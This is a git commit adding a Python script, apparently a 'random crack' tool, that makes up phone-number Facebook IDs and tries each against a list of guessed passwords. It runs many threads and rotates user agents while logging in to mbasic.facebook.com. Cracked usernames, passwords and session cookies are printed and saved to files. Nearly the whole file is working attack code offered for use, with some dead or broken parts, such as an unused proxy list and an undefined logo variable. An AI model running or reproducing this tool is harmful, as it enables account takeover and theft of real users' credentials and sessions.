360f863f3bf2e8f1784665882c99b355cf265863
vearahmad <69453119+vearahmad@users.noreply.github.com>
2023-12-01 14:01:59 +0300

    Create V107.py

---
+++ V107.py
@@ -0,0 +1,220 @@
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
+logo=("""
+
+\x1b[32m
+
+\33[1;31m, ＜￣｀ヽ、　　　　　　／￣＞
+\33[1;32m　ゝ、　　＼　／⌒ヽ,ノ 　/´
+\33[1;33m　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
+\33[1;34m　　 　　> MR,VEAR ,)
+　\33[1;35m　　　　∠_,,,/
+ MR,VEAR 
+\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31m\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
+\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MR,VEAR
+\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM-CLONE/ \x1b[1;92mACTIVE
+\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m Q3
+\033[38;5;46m{+} \x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]PAID-𝗩01\33[38;5;196m 
+\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31m\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
+""")
+
+def MONIRehc():
+	print('==================================================')
+
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" [1] RANDOM CRACK")
+        print(" [0] Exit")
+        MONIR =input("\n [?] Choices : ")
+        if MONIR in ["1"]:
+            fuck()
+        if MONIR in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+            
+def fuck():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] EXAMPLE CODE: 0750, 0751, 0770, 0772')
+    code = input('[?] CHOOSE CODE : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('[?] CHOOSE : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo1)
+        tl = str(len(user))
+        print('[+] Total ids: '+tl)
+        print("[+] Your Code: "+code)
+        print('[+] Process has been started')
+        print('[+] Use flight mode for speed up')
+        print('==================================================')
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'qaladza','qaladzaqaladza','qaladza123','qaladza1234','qaladza12345','hama123','hama1234','hama12345','hama1122','hama112233']
+            yaari.submit(mumit2,uid,pwx,tl)
+    print('==================================================')
+    print(' [+] Crack process has been completed')
+    print(' [+] OK Ids saved in MONIR/OK.txt')
+    print(' [+] CP Ids saved in MONIR/CP.txt')
+    print('==================================================')
+def mumit2(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;92m[MONIR]--[%s/%s]--[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            "path": '/',
+            "scheme": 'https',
+            'method':'GET',
+            'authority': 'mbasic.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2.75',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"M2102J20SG"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"""\033[1;92m[MR,VEAR-OK] ✅
+Username : {uid} 
+Password : {ps} 
+\nCookie : {coki}
+""")
+#____cp____info 👇👇
+                open('/sdcard/MR,VEAR/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"""\033[1;92m[MR,VEAR-CP] 
+Username : {cid}
+Password : {ps}
+""")
+                open('/sdcard/MR,VEAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
